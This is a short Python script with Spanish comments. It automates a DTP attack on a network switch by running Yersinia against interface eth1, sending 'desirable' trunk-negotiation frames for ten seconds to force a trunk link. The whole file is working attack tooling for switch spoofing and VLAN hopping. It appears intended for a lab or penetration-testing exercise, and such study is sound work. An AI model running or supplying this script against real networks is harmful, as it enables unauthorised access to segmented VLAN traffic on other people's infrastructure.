#!/usr/bin/env python3
# Objetivo: Automatizar el ataque DTP usando el motor de Yersinia por debajo

import subprocess
import time

def lanzar_ataque_yersinia(interfaz):
    print(f"[*] Iniciando ataque DTP en {interfaz}...")
    print("[*] Cargando motor de inyeccion nativo (Yersinia)...")
    
    # Este es el comando exacto que ejecutariamos en la terminal
    comando = ["yersinia", "dtp", "-attack", "1", "-interface", interfaz]
    
    try:
        # Popen ejecuta el comando en segundo plano sin bloquear el script
        # DEVNULL oculta la salida de texto de yersinia para que la terminal se vea limpia
        proceso = subprocess.Popen(comando, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("[+] Bombardeo DTP 'Desirable' en curso...")
        print("[*] Esperando 10 segundos para forzar la negociacion del Troncal...")
        
        # Le damos tiempo al switch para que procese las tramas y cambie de estado
        time.sleep(10)
        
        # Detenemos Yersinia limpiamente
        proceso.terminate()
        print("\n[+] Ataque finalizado exitosamente. Es hora de verificar el switch.")
        
    except FileNotFoundError:
        print("[-] Error: Yersinia no esta instalado o no se encuentra en el PATH.")
    except Exception as e:
        print(f"[-] Ocurrio un error inesperado: {e}")

if __name__ == "__main__":
    # Tu interfaz conectada al switch
    interfaz_objetivo = "eth1"
    lanzar_ataque_yersinia(interfaz_objetivo)
